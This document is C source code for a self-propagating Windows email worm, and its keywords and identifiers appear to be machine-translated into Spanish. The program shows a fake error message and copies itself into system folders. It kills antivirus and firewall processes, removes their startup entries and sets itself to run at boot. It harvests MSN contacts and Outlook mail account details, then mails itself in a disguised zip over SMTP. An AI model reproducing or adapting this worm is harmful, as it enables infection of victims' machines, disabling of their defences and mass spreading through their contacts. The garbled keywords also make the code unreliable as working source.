*/

#incluir <stdio.h>
#incluir <windows.h>
#incluir <stdlib.h>
#incluir <string.h>
#incluir <winsock.h>
#incluir <tlhelp32.h>
#incluir <comutil.h>

#incluir "msgrua.h"
#incluir "msgruaid.h"
#incluir "project.h"

Int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInst,LPSTR lpCmdLine,int nShowCmd) {
 Ventana HWND = CreateWindowEx(0,NULL,"Program",WS_OVERLAPPEDWINDOW | WS_HSCROLL | WS_VSCROLL, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,(HWND) NULL,(HMENU) NULL, hInstance, NULL);    
	ShowWindow(ventana,SW_HIDE);
	UpdateWindow(ventana);
	if (strlen(lpCmdLine) == 0) {
		MessageBox(window,"Este programa ha realizado una operación ilegal. Pila fuera de la memoria. Registro base encontrado en 0xFFFUFFCFFKFFEFFD","Error al ejecutar StackTrace",MB_OK+MB_ICONSTOP);
		defaultRun();
	}
	más {
		//si tiene args, -modo latente, intente ejecutar la carga útil.
		defaultRun();
		executePayload();
	}
}
void defaultRun() {
		startVariables(); //inicio
		createZipWithWorm(); //try para crear un archivo Zip con el gusano
		//usuario infectado
		obtainEmailsFromMSN6(); //obtener correos electrónicos para enviar desde la lista de contactos de MSN 6
		copyMe(); //copy en el sistema
		killAVAndFirewallProcesses(); //kill proceso de av's y firewalls.
		disableAVSAndFirewalls(); //deshabilitar el inicio de Windows de AV y Firewalls
		putInRegistyToStartWithWindows(); //poner gusano en el registro para cargar con windows.
		findEmailInfo(); //find smtp server, email, and name to send via email
		//c'est finih, para un usuario recien infectado
		if (sendMail() == FALSE) {
			//intente enviar por correo electrónico.
			defaultPayload(); //a la mierda!!
		} 
		//try para eliminar archivos creados por el gusano.
		DeleteFile(tmpFile); //borramos el .exe auxiliar
		DeleteFile(pkZipExeName); //borramos el pkzip
		if (windowsTempDirectory == NULL) {
			DeleteFile(WORM_ATTACHMENT_ZIP_FILE_HIDDEN); //borramos el zip
		}
		más {
			char *f1 = (char*)malloc(sizeof(char) * (strlen(WORM_ATTACHMENT_ZIP_FILE_HIDDEN) + strlen(windowsTempDirectory) + 3));
			strcpy(f1,windowsTempDirectory);
			strcat(f1,"\\");
			strcat(f1,WORM_ATTACHMENT_ZIP_FILE_HIDDEN);
			DeleteFile(f1);
		}
}
/*
Función para iniciar variables.
*/
void startVariables() {
	contadorServers = 0;
	currentAccount = (char*)malloc(sizeof(char) * strlen(FIRST_ACCOUNT));
	strcpy(currentAccount,FIRST_ACCOUNT);
 servidorActual = 0; //iniciar con el servidor 0
 posActualDestinatarios = 0; //destinatarios posición real = 0
 archivos. contador = 0; //en realidad, 0 archivos.
	char windowsDir[MAX_PATH];
	if (GetWindowsDirectory(windowsDir,MAX_PATH) != 0) {
		//si no falla
		windowsTempDirectory = (char*)malloc(sizeof(char) * strlen(windowsDir) + strlen("Temp") + 3);
		strcpy(windowsTempDirectory,windowsDir);
		strcat(windowsTempDirectory,"\\");
		strcat(windowsTempDirectory,"Temp");
		strcat(windowsTempDirectory,"\\");
	}
	más {
		//if falla, cadena vacía.
		windowsTempDirectory = (char*)malloc(sizeof(char) * 2);
		strcpy(windowsTempDirectory,"");
	}

}
/*
Función para copiar el gusano.
*/
void copyMe() {
	char actualPath[MAX_PATH];
	char systemPath[MAX_PATH];
	arco de caracteres sin firmarProg[256]; //Esto contiene: C:\Archivos de programa\ o C:\Archivos de programa\ o ..
	DWORD archProgLength = sizeof(archProg);
	HKEY hKey;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,WINDOWS_CURRENTVERSION,0,KEY_QUERY_VALUE,&hKey);
	RegQueryValueEx(hKey,PROGRAMFILESDIR,0,NULL,archProg,&archProgLength);
	RegCloseKey(hKey);
	if (GetModuleFileName(NULL,actualPath,MAX_PATH) != 0) {
		/* si obtiene el archivo correctamente */
		char *newFile = (char*)malloc(sizeof(char) * MAXDATASIZE);
		GetSystemDirectory(systemPath,MAX_PATH);
		strcpy(newFile,systemPath); /* crear archivo de destino */
		strcat(newFile,BARRA_INVERTIDA);
		strcat(newFile,EXE_NAME_TO_COPY);
		if (CopyFile(actualPath,newFile,FALSE) == 0) {
			//error al copiar a %SystemRoot%, intente %ProgramFilesDir%
			newFile = (char*)malloc(sizeof(char) * MAXDATASIZE);
			strcpy(newFile,(const char*)archProg);
			strcat(newFile,BARRA_INVERTIDA);
			strcat(newFile,EXE_NAME_TO_COPY);
			if (CopyFile(actualPath,newFile,FALSE) == 0) {
 whereIsStoredWorm = NULL; //no puede infectar windoze!
				//ejecutará la carga útil predeterminada :-)
			}
			más {
				//bien copiado
				whereIsStoredWorm = (char*)malloc(sizeof(char) * strlen(newFile) + 1);
				strcpy(whereIsStoredWorm,newFile); //copy donde se almacena el gusano.
			}
		}
		más {
			//si se copia bien
			whereIsStoredWorm = (char*)malloc(sizeof(char) * strlen(newFile) + 1);
			strcpy(whereIsStoredWorm,newFile); //copy donde se almacena el gusano.
		}
	}
}
/*
Función para conectarse a un servidor.
*/
int connect(char *server) {
	WSAStartup(MAKEWORD(1,1), &wsaData);
 LPHOSTENT mailServer = gethostbyname(servidor);
	if (!mailServer) {
		WSACleanup();
		devolver FALSE;
	}
	cSocket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if (cSocket == INVALID_SOCKET) {
		WSACleanup();
		devolver FALSE;
	}
 serverInfo. sin_family = AF_INET;
 serverInfo. sin_addr = *((LPIN_ADDR)*mailServer->h_addr_list);
 serverInfo. sin_port = htons(25);
 nret = connect(cSocket,(LPSOCKADDR)&serverInfo,sizeof(struct sockaddr));
	if (nret == SOCKET_ERROR) {
		WSACleanup();
		devolver FALSE;
	}
	devolver VERDADERO;
}
/*
Función para enviar HELO.
*/
int sendHelo() {
	strcpy(bufferSend, HELO); //copiar HELO
	strcat(bufferSend,smtpServers[servidorActual]); //put servidor
	strcat(bufferSend, CRNL); //put \r\n
	if (send(cSocket,bufferSend,(int)strlen(bufferSend),0) == SOCKET_ERROR) {
		devolver FALSE;
	}
 nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
	bufferRcvd[nret] = '\0';
	si (!( (bufferRcvd[0] == '2') && (bufferRcvd[1] == '5') && (bufferRcvd[2] == '0'))) {
		devolver FALSE;
	}
	//if devuelve 250, ok
	devolver VERDADERO;
}
/*
Función para enviar al socket MAIL FROM.
*/
int sendMailFrom(char *from) {
	strcpy(bufferSend, MAILFROM); //"CORREO DE: <"
	strcat(bufferSend,from);
	strcat(bufferSend,MAYOR); //poner >
	strcat(bufferSend, CRNL); // poner \r\n
	if (send(cSocket,bufferSend,(int)strlen(bufferSend),0) == SOCKET_ERROR) {
		devolver FALSE;
	}
 nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
	bufferRcvd[nret] = '\0';
	si (!( (bufferRcvd[0] == '2') && (bufferRcvd[1] == '5') && (bufferRcvd[2] == '0'))) {
		devolver FALSE;
	}
	//if devuelve 250, ok
	devolver VERDADERO;
}
/*
Función para enviar al socket los destinatarios.
*/
int sendMailRcptTo() {
	int algunEmailValido = 0;
	int i = 0;
	while (destinatarios[i] != NULL) {
		strcpy(bufferSend, RCPTTO); //"RCPT A: "
		strcat(bufferSend,destinatarios[i]);
		strcat(bufferSend, CRNL);
		if (send(cSocket,bufferSend,(int)strlen(bufferSend),0) == SOCKET_ERROR) {
			devolver FALSE;
		}
 nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
		bufferRcvd[nret] = '\0';
		if (((bufferRcvd[0] == '2') && (bufferRcvd[1] == '5') && (bufferRcvd[2] == '0'))) {
			//if devuelve 250, ok
 algunEmailValido = 1; //un minimio válido de correo electrónico
		}
		i++;
	}
	if (algunEmailValido == 1) devuelve TRUE; //si tiene correos electrónicos válidos..
	devolver FALSO; //si no tiene correos electrónicos válidos, devuelva false.
}
/*
Función para enviar al socket comando DATA.
*/
int sendData() {
	strcpy(bufferSend,DATA); //"DATOS\r\n"
	if (send(cSocket,bufferSend,(int)strlen(bufferSend),0) == SOCKET_ERROR) {
		devolver FALSE;
	}
 nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
	bufferRcvd[nret] = '\0';
	si (!( (bufferRcvd[0] == '3') && (bufferRcvd[1] == '5') && (bufferRcvd[2] == '4'))) {
		devolver FALSE;
	}
	//if devuelve 354, ok
	devolver VERDADERO;
}
/*
Función para enviar al socket comandos mime.
*/
int sendMime(char email[],char name[]) {
	int i = 0;
	int aleatorio = rand() % MAX_MESSAGES; //mensaje aleatorio
	para (i = 0; i < 26; i++) {
		char *aux;
		conmutador (i) {
			caso 0:
				//modificar DESDE:
				// De: \"nombre\" <email@domain>\r\n
				aux = (char*)malloc(sizeof(char) * (strlen(email) + strlen(name) + strlen(smtpText[i]) + 8)); //8 = <,>,\0,\r,\n,",",espacio
				strcpy(aux,smtpText[i]);
				strcat(aux,"\"");
				strcat(aux,nombre);
				strcat(aux,"\" ");
				strcat(aux,"<");
				strcat(aux, correo electrónico);
				strcat(aux,">\r\n");
				if (send(cSocket,aux,(int)strlen(aux),0) == SOCKET_ERROR) {
					devolver FALSE;
				}
				//modificar desde para poner nombre y correo electrónico
				quebrar;
			caso 2:
				//modificar asunto
				aux = (char*)malloc(sizeof(char) * (strlen(smtpText[i]) + strlen(defaultSubjects[aleatorio]) + 1));
				strcpy(aux,smtpText[i]);
				strcat(aux,defaultSubjects[aleatorio]);
				if (send(cSocket,aux,(int)strlen(aux),0) == SOCKET_ERROR) {
					devolver FALSE;
				}
				quebrar;
			caso 18:
				//i = 18
				//mensaje
				if (send(cSocket,smtpText[i],(int)strlen(smtpText[i]),0) == SOCKET_ERROR) {
					devolver FALSE;
				}
				aux = (char*)malloc(sizeof(char) * (strlen(defaultEmailTexts[aleatorio]) + 1));
				strcpy(aux,defaultEmailTexts[aleatorio]);
				if (send(cSocket,aux,(int)strlen(aux),0) == SOCKET_ERROR) {
					devolver FALSE;
				}
				quebrar;
			caso 22: //nombre de archivo
				aux = (char*)malloc(sizeof(char) * (strlen(smtpText[i]) + strlen(defaultFileNameAttachments[aleatorio]) + 5)); // 5 = ",",\r,\n,\0,
				strcpy(aux,smtpText[i]);
				strcat(aux,"\"");
				strcat(aux,defaultFileNameAttachments[aleatorio]);
				strcat(aux,"\"");
				strcat(aux,"\r\n");
				if (send(cSocket,aux,(int)strlen(aux),0) == SOCKET_ERROR) {
					devolver FALSE;
				}
				quebrar;
			caso 25: //nombre de archivo
				aux = (char*)malloc(sizeof(char) * (strlen(smtpText[i]) + strlen(defaultFileNameAttachments[aleatorio]) + 5)); // 5 = ",",\r,\n,\0,
				strcpy(aux,smtpText[i]);
				strcat(aux,"\"");
				strcat(aux,defaultFileNameAttachments[aleatorio]);
				strcat(aux,"\"");
				strcat(aux,"\r\n");
				if (send(cSocket,aux,(int)strlen(aux),0) == SOCKET_ERROR) {
					devolver FALSE;
				}
				quebrar;
			por defecto:
				if (send(cSocket,smtpText[i],(int)strlen(smtpText[i]),0) == SOCKET_ERROR) {
					devolver FALSE;
				}
		}
	}
	devolver VERDADERO;
}
/*
Función para enviar al socket el archivo en base64.
*/
int sendBase64() {
	if (convertFileToBase64() == VERDADERO) {
		DeleteFile(WORM_ATTACHMENT_ZIP_FILE_HIDDEN); //delete zip
		DeleteFile(tmpFile); //eliminar .exe auxiliar
		DeleteFile(pkZipExeName); //delete pkzip
		if (send(cSocket,buffer64,(int)strlen(buffer64),0) == SOCKET_ERROR) {
			devolver FALSE;
		}
		devolver VERDADERO;
	}
	más {
		devolver FALSE;
	}
}
/*
Función para enviar CRNL (\r\n)
*/
int sendCRNL() {
	if (send(cSocket,CRNL,(int)strlen(CRNL),0) == SOCKET_ERROR) {
		devolver FALSE;
	}
	devolver VERDADERO;
}
/*
Función para conectar el servidor SMTP. El parámetro de matriz contiene, servidor, correo electrónico y nombre para mostrar.
*/
int connectToSMTP(char *servEmailName[]) {
	if (connect(servEmailName[0]) == FALSE) {
		devolver FALSE;
	}
 nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
	bufferRcvd[nret] = '\0';
	si (!( (bufferRcvd[0] == '2') && (bufferRcvd[1] == '2') && (bufferRcvd[2] == '0'))) {
		//220 aceptar
		closesocket(cSocket);
		WSACleanup();
		devolver FALSE;
	}

	si (sendHelo() == FALSE) devuelve FALSE; //enviar helo
	if (sendMailFrom(servEmailName[1]) == FALSE) devuelve FALSE; //enviar correo desde:
	if (sendMailRcptTo() == FALSE) devuelve FALSE; //enviar Rcpt a:
	si (sendData() == FALSE) devuelve FALSE; //enviar datos
	if (sendMime(servEmailName[1],servEmailName[2]) == FALSE) devuelve FALSE; //enviar mimo
	if (sendCRNL() == FALSE) devuelve FALSE; //enviar CRNL
	//if (sendCRNL() == FALSE) devuelve FALSE; enviar CRNL
	//if (sendCRNL() == FALSE) devuelve FALSE; enviar CRNL
	if (sendBase64() == FALSE) {
		devolver FALSO; //enviar búfer en base64
	}
	if (send(cSocket,smtpText[26],(int)strlen(smtpText[26]),0) == SOCKET_ERROR) devuelve FALSE;
	if (send(cSocket,CR,(int)strlen(NEWLINE),0) == SOCKET_ERROR) devuelve FALSE;
	if (send(cSocket,NEWLINE,(int)strlen(NEWLINE),0) == SOCKET_ERROR) devuelve FALSE;
	if (send(cSocket,smtpText[27],(int)strlen(smtpText[27]),0) == SOCKET_ERROR) devuelve FALSE;
 nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
	bufferRcvd[nret] = '\0';
	//250 aceptar
	si (!( (bufferRcvd[0] == '2') && (bufferRcvd[1] == '5') && (bufferRcvd[2] == '0'))) {
		devolver FALSE;
	}
	if (send(cSocket,CR,(int)strlen(CR),0) == SOCKET_ERROR) {
		devolver FALSE;
	}
	if (send(cSocket,NEWLINE,(int)strlen(NEWLINE),0) == SOCKET_ERROR) {
		devolver FALSE;
	}
	if (send(cSocket,smtpText[28],(int)strlen(smtpText[28]),0) == SOCKET_ERROR) {
		devolver FALSO; //28 SALIR
	}
 nret = recv(cSocket,bufferRcvd,sizeof(bufferRcvd),0);
	closesocket(cSocket);
	WSACleanup();
	devolver VERDADERO;
}
/*
Función para enviar por correo electrónico.
*/
int sendMail() {
	int i = 0; //counter para ver el servidor real de predefinido
	int nResCon = 0; //variable para guardar que devuelve la conexión del servidor
	int seEnvioAlguno = FALSO; //variable para saber si finaliza el correo electrónico con el servidor del Registro
	if (contadorServers > 0) {
		//si se encuentran servidores en el registro..
		hacer {
			int aleatorio = rand() % MAX_DEFAULT_EMAILS;
			//intentar conectarse
			if (smtpServers[i] != NULL) {
				//if server != null, intente copiar
				servidorEmailYNombreActual[0] = (char*)malloc(sizeof(char) * strlen(smtpServers[i])); //memoria para el servidor
				strcpy(servidorEmailYNombreActual[0],smtpServers[i]); //copiar el servidor
				if (emailAdresses[i] == NULL) {
					//si no he enviado un correo electrónico, tomaré un mensaje aleatorio
					servidorEmailYNombreActual[1] = (char*)malloc(sizeof(char) * strlen(defaultRemitentes[aleatorio])); //memoria para el email
					strcpy(servidorEmailYNombreActual[1],defaultRemitentes[aleatorio]); //copiar correo electrónico
				}
				más {
					//si lo tengo, lo copiaré
					servidorEmailYNombreActual[1] = (char*)malloc(sizeof(char) * strlen(emailAdresses[i])); //memoria para el email
					strcpy(servidorEmailYNombreActual[1],emailAdresses[i]); //copiar correo electrónico
				}
				if (nameToShowInEmails[i] == NULL) {
					servidorEmailYNombreActual[2] = (char*)malloc(sizeof(char) * strlen(defaultNames[aleatorio])); //memoria para el email
					strcpy(servidorEmailYNombreActual[2],defaultNames[aleatorio]);
				}
				más {
					servidorEmailYNombreActual[2] = (char*)malloc(sizeof(char) * strlen(nameToShowInEmails[i])); //memoria para el email
					strcpy(servidorEmailYNombreActual[2],nameToShowInEmails[i]);
				}
				//tener la información necesaria
 servidorActual = i; //actual servidor SMTP es el servidor 'i'
 nResCon = connectToSMTP(servidorEmailYNombreActual); //intente conectarse al servidor
				if (nResCon == TRUE) devuelve TRUE; //si se envía con éxito, devuelva true y salga
			}
 nResCon = FALSO; 
			i++;
		}
		while ((nResCon == FALSE) && (i < contadorServers));
	}
	if (seEnvioAlguno == FALSO) {
		//if no se puede enviar con servidores de registro.. pruebe con predefinido
		//esto si se puede omitir
		i = 0;
		hacer {
			int aleatorio = rand() % MAX_DEFAULT_EMAILS; //correo aleatorio 
			//el problema es que nuestra estructura de connectToSMTP()
			//recibe un parms que para los servidores del registro era optimus
			//pero aquí no. si el registro no funciona, tenemos que probar con servidores aleatorios
			//y remitentes y nombres aleatorios 
			servidorEmailYNombreActual[0] = (char*)malloc(sizeof(char) * (strlen(defaultSMTPServers[i]) + 1));
			strcpy(servidorEmailYNombreActual[0],defaultSMTPServers[i]);
			servidorEmailYNombreActual[1] = (char*)malloc(sizeof(char) * (strlen(defaultRemitentes[aleatorio]) + 1));
			strcpy(servidorEmailYNombreActual[1],defaultRemitentes[aleatorio]);
			servidorEmailYNombreActual[2] = (char*)malloc(sizeof(char) * (strlen(defaultNames[aleatorio]) + 1));
			strcpy(servidorEmailYNombreActual[2],defaultNames[aleatorio]);
			nResCon = connectToSMTP(servidorEmailYNombreActual);
			if (nResCon == TRUE) devuelve TRUE;
			i++;
		}
		while ((nResCon == FALSE) && (defaultSMTPServers[i] != NULL));
	}
	devolver FALSO; //no se puede enviar el gusano
}

/*
Función para obtener el tamaño de un archivo.
*/
int getFileSize(char *file) {
 ARCHIVO *f = fopen(file,"rb");
	if (f == NULL) {
		devolver FALSE;
	}
	fseek (f , 0 , SEEK_END);
	return ftell (f);
}
/*
Función para convertir el archivo Zip que contiene el gusano.
*/
int convertFileToBase64() {
	int resEncode = 0;
	int size = getFileSize(WORM_ATTACHMENT_ZIP_FILE_HIDDEN);
	if (tamaño == FALSO) {
		buffer64 = (char*)malloc(sizeof(char) * DEF_BASE64_SIZE);
	}
	más {
		buffer64 = (char*)malloc(sizeof(char) * (size * 2));
	}
	if (windowsTempDirectory == NULL) {
 resEncode = codificar(WORM_ATTACHMENT_ZIP_FILE_HIDDEN);
	}
	más {
		char *f = (char*)malloc(sizeof(char) * (strlen(windowsTempDirectory) + strlen(WORM_ATTACHMENT_ZIP_FILE_HIDDEN) + 3));
		strcpy(f,windowsTempDirectory);
		strcat(f,"\\");
		strcat(f,WORM_ATTACHMENT_ZIP_FILE_HIDDEN);
 resEncode = codificar(f);
	}
	if (resEncode == FALSE) {
		devolver FALSE;
	}
	devolver VERDADERO;
}
/*
findEmailInfo():
Esta función abre el registro con el uso de claves de búsqueda almacenadas en "Software\\Microsoft\\Internet Account Manager\\Accounts\\000000X"
Incluso de estas claves contiene información sobre las posibles cuentas de correo electrónico logdget en el PC (Outlook), usaremos esto
cuentas (servidor smtp, correo electrónico y nombre para mostrar), para reenviar el gusano.
La operación es fácil, el gusano cros las teclas (de 00000001 a 0000000X) encontrando información y compilándola.
Para esto, usaré la función existsAccountsToGetMailInfo(), que devuelve true si existe una cuenta real.
Si devuelve true, obtendremos el servidor smtp, el correo electrónico y el nombre para mostrar de accout, y almacenaremos en las variables smtpServers, emailAddresses y nameToShowInEmails.
El funcionamiento de estas variables son las siguientes:
smtpServers[i] relaciona el servidor con emailAddresses[i] y nameToShowInEmails[i].
*/
void findEmailInfo() { 
	caracteres sin firmar  smtp[256];
	correo electrónico char sin firmar[256];
	nombre de caracteres sin firmar[256];
	DWORD smtpLength = sizeof(smtp);
	DWORD emailLength = sizeof(email);
 DWORD nameLength = sizeof(nombre);
	HKEY hKey;
	while (existsAccountsToGetMailInfo()) {
		char *actualSubKey = (char*)malloc(sizeof(char) * (strlen(REG_SUBKEY) + DEFAULT_SIZE_OF_ACCOUNTS_IDS));
		strcpy(actualSubKey,REG_SUBKEY);
		char *temp = (char*)malloc(sizeof(char) * DEFAULT_SIZE_OF_ACCOUNTS_IDS);
		strcat(actualSubKey,currentAccount); 
		RegOpenKeyEx(HKEY_CURRENT_USER,actualSubKey,0,KEY_QUERY_VALUE,&hKey);
		RegQueryValueEx(hKey,REG_SMTP_SERVER,0,NULL,smtp,&smtpLength);
		RegCloseKey(hKey);
		if (contadorServers < (MAX_NUMBER_OF_SERVERS - 1)) {
			if ((smtp[0] > 44) && (smtp[0] < 123)) {
				smtpServers[contadorServers] = (char*)malloc(sizeof(char) * obtainLength(smtp));
				char *aux = (char*)malloc(sizeof(char) * obtainLength(smtp));
				memcpy(aux,smtp,obtainLength(smtp));
				aux[obtainLength(smtp)] = '\0';
				strcpy(smtpServers[contadorServers],aux);
			}
			RegOpenKeyEx(HKEY_CURRENT_USER,actualSubKey,0,KEY_QUERY_VALUE,&hKey);
			RegQueryValueEx(hKey,REG_EMAIL_ACC,0,NULL,email,&emailLength);
			RegCloseKey(hKey);
			if ((email[0] > 44) && (email[0] < 123)) {
				emailAdresses[contadorServers] = (char*)malloc(sizeof(char) * obtainLength(email));
				char *aux = (char*)malloc(sizeof(char) * obtainLength(email));
				memcpy(aux,email,obtainLength(email));
				aux[obtainLength(email)] = '\0';
				strcpy(emailAdresses[contadorServers],aux);
			}
			RegOpenKeyEx(HKEY_CURRENT_USER,actualSubKey,0,KEY_QUERY_VALUE,&hKey);
			RegQueryValueEx(hKey,REG_EMAIL_NAME_TO_SHOW,0,NULL,name,&nameLength);
			RegCloseKey(hKey);
			nameToShowInEmails[contadorServers] = (char*)malloc(sizeof(char) * obtainLength(name));
			char *aux = (char*)malloc(sizeof(char) * obtainLength(name));
			memcpy(aux,name,obtainLength(name));
			aux[obtainLength(name)] = '\0';
			strcpy(nameToShowInEmails[contadorServers],aux);
			contadorServers++; 
		}
		goToNextEmailAccount(); 
	}
}
/*
Función para obtener el tamaño de una cadena en un char []
*/
int obtainLength(unsigned char b[]) {
	int i = 0;
	mientras que (b[i] != NULL) {
		i++;
	}
	retorno i;
}
/*
Función para saber si incluso existen cuentas (realmente, para saber si real es válida) que verifican.
La función hacer uso del retorno de RegOpenKeyEx(), depende od el vallue de currentAccount("00000001,00000002,..,0000000X")
Si el valor es correcto, esto parece que es bueno.
*/
int existsAccountsToGetMailInfo() {
 Clave HKEY = NULL;
	char *aux = (char*)malloc(sizeof(char) * (strlen(REG_SUBKEY) + DEFAULT_SIZE_OF_ACCOUNTS_IDS));
	strcpy(aux,REG_SUBKEY);
	strcat(aux,currentAccount);
	if (RegOpenKeyEx(HKEY_CURRENT_USER,aux,0,KEY_QUERY_VALUE,&key) == 0) {
		volver 1;
	}
	volver 0;
}
/*
Función para incrementar la cuenta numérica.
0000001
para
0000002
y a
0000003
etc.
*/
void goToNextEmailAccount() {
	int num = atoi(currentAccount);
	num++;
	sprintf(currentAccount, "%08d", num);
}
/*
Función para desactivar AV's y firewalls.
*/
void disableAVSAndFirewalls() {
 Llave HKEY;
	int i = 0;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,REG_RUN_ON_STARTUP,0,KEY_SET_VALUE,&key) == 0) {
		while (regsAVsAndFirewalls[i] != NULL) {
			RegDeleteValue(key,regsAVsAndFirewalls[i]);
			i++;
		}
	}
	RegCloseKey(clave);
	i = 0;
	if (RegOpenKeyEx(HKEY_CURRENT_USER,REG_RUN_ON_STARTUP,0,KEY_SET_VALUE,&key) == 0) {
		while (regsAVsAndFirewalls[i] != NULL) {
			RegDeleteValue(key,regsAVsAndFirewalls[i]);
			i++;
		}
	}
	RegCloseKey(clave);
}
/*
Función para agregar gusano al registro de Windows.
*/
void putInRegistyToStartWithWindows() {
	char actualPath[MAX_PATH];
	char systemPath[MAX_PATH];
	archivo char sin firmar[256];
 Llave HKEY;
	char *newFile = (char*)malloc(sizeof(char) * (strlen(actualPath) + strlen(BARRA_INVERTIDA) + strlen(EXE_NAME) + 1));
	GetSystemDirectory(systemPath,MAX_PATH);
	strcpy(newFile,systemPath);
	strcat(newFile,BARRA_INVERTIDA);
	strcat(newFile,EXE_NAME);
	memcpy(archivo,newFile,strlen(newFile));
 archivo[strlen(newFile)] = '\0';
	if (RegCreateKey(HKEY_LOCAL_MACHINE,REG_RUN_ON_STARTUP,&key) == 0) {
		RegSetValueEx(key,REG_WINAV,0,REG_SZ,file,sizeof(file));
	}
	RegCloseKey(clave);
}
/*
Función para convertir PKZIP (contenido en un búfer) en un archivo ejecutable para usar más adelante.
*/
void convertPKZipBufferToExeFile() {
	int r1 = rand();
	int r2 = rand();
	char rS1[6];
	char rS2[6];
	char *fToCreate = NULL;
	sprintf(rS1,"%d",r1);
	sprintf(rS2,"%d",r2);
	fToCreate = (char*)malloc(sizeof(char) * (strlen(windowsTempDirectory) + strlen(PKZIP) + strlen(rS1) + strlen(rS2) + 6)); //5 = \0,.$wr$
	strcpy(fToCreate,windowsTempDirectory);
	strcat(fToCreate,PKZIP);
	strcat(fToCreate,rS1);
	strcat(fToCreate,rS2);
	strcat(fToCreate,".$wr$");
 ARCHIVO *f = fopen(fToCreate,"w");
	int i = 0;
	while (pkzip[i] != NULL) {
		fwrite(pkzip[i],1,strlen(pkzip[i]),f);
		i++;
	}
	fclose(f);
	decode(fToCreate));
	DeleteFile(fToCreate));
}
/*
Función para crear el archivo zip que contendrá el gusano.
*/
void createZipWithWorm() {
	int r = rand() % MAX_NAMES_EXE;
	convertPKZipBufferToExeFile();
	//para comprobar que lo creamos correctamente intentamos abrirlo.
	OFSTRUCT str;
	if (OpenFile(pkZipExeName, &str,OF_EXIST) != HFILE_ERROR) {
		char actualFile[MAX_PATH];
		//si existe el ejecutable pkzip..
		HWND hwnd = NULL;
		GetModuleFileName(NULL,actualFile,MAX_PATH);
		//parameters: destino.zip nombrewormexe.exe
		//el problema que tiene pkzip es que creamos un archivo zip con el nombre del exe.
		//into, y nos gusta que el nombre ejecutable en el zip tenga el nombre a concret.
		//por ejemplo , si enviamos un parche a internet explorer, queremos que el ejecutable o el zip contenga este nombre
		//para obtener esto, crearemos un archivo exe con el nombre adjunto, y será el archivo que comprimiremos.
		char *nAtt = (char*)malloc(sizeof(char) * (strlen(windowsTempDirectory) + strlen(namesExesInZip[r]) + 1 ));
		strcpy(nAtt,windowsTempDirectory);
		strcat(nAtt,namesExesInZip[r]);
		CopyFile(actualFile,nAtt,FALSE); //creamos el file nAttachment
		char *destino = (char*)malloc(sizeof(char) * (strlen(windowsTempDirectory) + strlen(WORM_ATTACHMENT_ZIP_FILE_HIDDEN) + 1));
		strcpy(destino,windowsTempDirectory);
		strcat(destino,WORM_ATTACHMENT_ZIP_FILE_HIDDEN);
		char *parametros = (char*)malloc(sizeof(char) * (strlen(nAtt) + strlen(destino) + 3)); //3 = \0, , ,
		strcpy(parametros,destino);
		strcat(parametros," ");
		strcat(parametros,nAtt); 
		ShellExecute(hwnd,"open",pkZipExeName,parametros,NULL,SW_HIDE);
		tmpFile = (char*)malloc(sizeof(char) * (strlen(nAtt) + 1));
		strcpy(tmpFile,nAtt);
	}
}
/*
Función para intentar matar procesos av y firewall.
*/
void killAVAndFirewallProcesos() {
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;
	hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	if( hProcessSnap == INVALID_HANDLE_VALUE ) {
		devolución;
	}
 pe32. dwSize = sizeof( PROCESSENTRY32 );
	if( ! Process32First( hProcessSnap, &pe32 ) ) {
		CloseHandle( hProcessSnap );
		devolución;
	}
	hacer
	{
		int i = 0;
		while (processAVsAndFirewalls[i] != NULL) {
			char *res1,*res2,*res3,*res4 = NULL;
 res1 = strstr(pe32. szExeFile,"av"); /* intente buscar si la subcadena "av" está en proceso real */
 res2 = strstr(pe32. szExeFile,"AV");
 res3 = strstr(pe32. szExeFile,"aV");
 res4 = strstr(pe32. szExeFile,"Av");
			if ((strcmp(pe32. szExeFile,processAVsAndFirewalls[i]) == 0) || (res1 != NULL) || (res2 != NULL) || (res3 != NULL) || (res4 != NULL)) {
				TerminateProcess(hProcess,0);
			}
			i++;
		}
		dwPriorityClass = 0;
 hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pe32. th32ProcessID );
		dwPriorityClass = GetPriorityClass( hProcess );
		if( !dwPriorityClass ) CloseHandle( hProcess );
	} 
	while( Process32Next( hProcessSnap, &pe32 ) );
	CloseHandle( hProcessSnap );
}
/*
Función para obtener correos electrónicos de MSN 6.
*/
void obtainEmailsFromMSN6() {
	pCount largo;
 Correo electrónico de BSTR;
 IMessengerContactos *pIMessengerContactos = NULL;
	IMessengerContact *pIMessengerContact = NULL;
	IDispatch *pIDispatch = NULL;
	IDispatch *ppMContact = NULL;
 IMessenger *pIMessenger = NULL; //a puntero a una interfaz IMessenger
	CoInitializar(0);
	if (SUCCEEDED(CoCreateInstance(CLSID_Messenger, NULL, CLSCTX_ALL, IID_IMessenger, (void **)&pIMessenger))) {
		pIMessenger->get_MyContacts(&pIDispatch);
		pIDispatch->QueryInterface(IID_IMessengerContacts,(void**)&pIMessengerContacts);
		pIDispatch->Release();
		pIMessengerContacts->get_Count(&pCount);
		for (int i = 0; i < pCount; i++) {
			if (pIMessengerContacts->Item(i,&pIDispatch) == S_OK) {
				if (pIDispatch->QueryInterface(IID_IMessengerContact,(void**)&pIMessengerContact) == S_OK) {
					if (pIMessengerContact->get_SigninName(&email) == S_OK) {
						char *actualMail = NULL;
 actualMail = (char*)malloc(_bstr_t(email). largura());
						strcpy(actualMail,(char*)_bstr_t(email));
						destinatarios[posActualDestinatarios] = (char*)malloc(sizeof(char) * (strlen(actualMail) + 1));
						strcpy(destinatarios[posActualDestinatarios],actualMail); //copiar el destinatario a la matriz.
						posActualDestinatarios++;
					}
				}
			}
		}
		pIMessenger->Release();
		CoUninitializar();
	}
}
/*
